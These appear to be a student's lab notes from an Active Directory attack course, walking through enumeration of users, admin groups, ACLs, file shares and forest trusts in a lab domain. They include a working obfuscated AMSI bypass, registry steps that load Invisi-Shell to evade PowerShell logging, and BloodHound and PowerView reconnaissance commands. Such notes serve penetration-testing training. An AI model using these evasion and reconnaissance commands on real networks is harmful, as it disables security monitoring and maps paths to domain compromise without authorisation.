### SUMMARY 
- [Learning Objective 1](#Learning-Objective-1)
- [Learning Objective 2](#Learning-Objective-2)
- [Learning Objective 3](#Learning-Objective-3)
- [Learning Objective 4](#Learning-Objective-4)

### AMSI bypass
```
S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + 
('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GetvarI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( 
"{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f 
'.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 
'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em') ) )."g`etf`iElD"( 
( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 
'ile','a')) ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}"
-f'ubl','P')+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

### Start a PowerShell session using Invisi-Shell to avoid enhanced logging
```
C:\AD\Tools>C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```
```
C:\AD\Tools>set COR_ENABLE_PROFILING=1
C:\AD\Tools>set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}
C:\AD\Tools>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-
b283c03916db}" /f
The operation completed successfully.
C:\AD\Tools>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-
b283c03916db}\InprocServer32" /f
The operation completed successfully.
C:\AD\Tools>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-
b283c03916db}\InprocServer32" /ve /t REG_SZ /d 
"C:\AD\Tools\InviShell\InShellProf.dll" /f
The operation completed successfully.
C:\AD\Tools>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
```

### Load PowerView
```
. C:\AD\Tools\PowerView.ps1
```

### Learning Objective 1
#### Enumerate following for the dollarcorp domain:
* Users
* Computers
* Domain Administrators
* Enterprise Administrators
* Use BloodHound to identify the shortest path to Domain Admins in the dollarcorp domain.
* Find a file share where studentx has Write permissions.

### PowerView
**List informations about all users** 
```
Get-DomainUser
```

**List a specific property of all the users**
```
Get-DomainUser | select -ExpandProperty samaccountname
```

**Enumerate member computers**
```
Get-DomainComputer | select -ExpandProperty dnshostname
```

**See details of the Domain Admins group**
```
Get-DomainGroup -Identity "Domain Admins"
```

**Enumerate members of the Domain Admins group**
```
Get-DomainGroupMember -Identity "Domain Admins"
```

**Enumerate members of the Enterprise Admins group**
```
Get-DomainGroupMember -Identity "Enterprise Admins"
```

**Query the root domain as Enterprise Admins group is present only in the root of a forest**
```
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local
```
### ADModule

**Import ADModule**
```
Import-Module C:\AD\Tools\ADModulemaster\Microsoft.ActiveDirectory.Management.dll
Import-Module C:\AD\Tools\ADModulemaster\ActiveDirectory\ActiveDirectory.psd1
```

**Enumerate All users***
```
Get-ADUser -Filter *
```

**List specific properties**
```
Get-ADUser -Filter * -Properties *| select Samaccountname,Description
```

**List All Computers**
```
Get-ADComputer -Filter *
```

**Enumerate Domain Administrators**
```
Get-ADGroupMember -Identity 'Domain Admins'
```

**Enumerate the Enterprise Administrators**
```
Get-ADGroupMember -Identity 'Enterprise Admins' -Server moneycorp.local
```

### BloodHound ingestores
```
C:\AD\Tools\BloodHound-master\BloodHoundmaster\Collectors\SharpHound.exe --collectionmethods Group,GPOLocalGroup,Session,Trusts,ACL,Container,ObjectProps,SPNTargets --excludedcs
```

### PowerHuntShares
```
Import-Module C:\AD\Tools\PowerHuntShares.psm1
Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools\ -HostList C:\AD\Tools\servers.txt

[*][12/24/2024 04:02] - All files written to C:\AD\Tools\\SmbShareHunt12242024040138
```

### Learning Objective 2
#### Enumerate following for the dollarcorp domain:
* ACL for the Domain Admins group
* ACLs where studentx has interesting permissions
* Analyze the permissions for studentx in BloodHound UI

**Enumerate ACLs for the Domain Admins Group**
```
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose
```
```
AceQualifier : AccessAllowed
ObjectDN : CN=Domain 
Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
ActiveDirectoryRights : ReadProperty
ObjectAceType : User-Account-Restrictions
ObjectSID : S-1-5-21-719815819-3726368948-3917688648-512
InheritanceFlags : None
BinaryLength : 60
AceType : AccessAllowedObject
ObjectAceFlags : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback : False
PropagationFlags : None
SecurityIdentifier : S-1-5-32-554
AccessMask : 16
AuditFlags : None
IsInherited : False
AceFlags : None
InheritedObjectAceType : inetOrgPerson
OpaqueLength : 0
```

**check for modify rights/permissions for the studentx**
```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "studentx"} 
```

**Check permissions on RDPUsers group**
```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```



### Learning Objective 4
**Enumerate all domains in the moneycorp.local forest** 
* Map the trusts of the dollarcorp.moneycorp.local domain.
* Map External trusts in moneycorp.local forest. 
* Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest?

### PowerView

**Enumerate all domains in the current forest**
```
Get-ForestDomain -Verbose
```

**Map all the trusts of the dollarcorp domain**
```
Get-DomainTrust
```

**List only the external trusts**
```
Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```

**Identify external trusts of the dollarcorp domain**
```
Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```

**Since the above is a Bi-Directional trust, we can extract information from the eurocorp.local forest**
```
Get-ForestDomain -Forest eurocorp.local | %{Get-DomainTrust -Domain $_.Name}
```


## Using Active Directory module
```
(Get-ADForest).Domains

Get-ADTrust -Filter *

Get-ADForest | %{Get-ADTrust -Filter *}

(Get-ADForest).Domains | %{Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)' -Server $_}

Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)'

Get-ADTrust -Filter * -Server eurocorp.local
```

